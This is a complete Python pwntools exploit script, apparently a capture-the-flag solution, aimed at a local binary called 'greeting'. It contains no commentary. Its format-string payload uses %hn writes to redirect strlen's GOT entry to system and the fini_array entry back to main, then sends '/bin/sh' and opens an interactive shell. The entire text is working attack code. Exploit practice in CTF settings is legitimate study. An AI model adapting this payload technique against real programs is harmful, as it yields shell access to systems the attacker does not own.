#!/usr/bin/env python3

import sys
import struct
import pwn


def b(x):
    return struct.pack("I", x)

io = pwn.process("./greeting")

fini_array = 0x8049934  # to 0x80485ed
strlen_got = 0x8049A54  # to 08048490
main = 0x80485ed
system_plt = 0x8048490

payload = b"AA"
payload += b(strlen_got + 2)
payload += b(strlen_got)
payload += b(fini_array)
payload += b"%2020x"
payload += b"%12$hn"
payload += b"%31884x"
payload += b"%13$hn"
payload += b"%349x"
payload += b"%14$hn"

io.sendline(payload)
io.sendline(b"/bin/sh")

io.interactive()
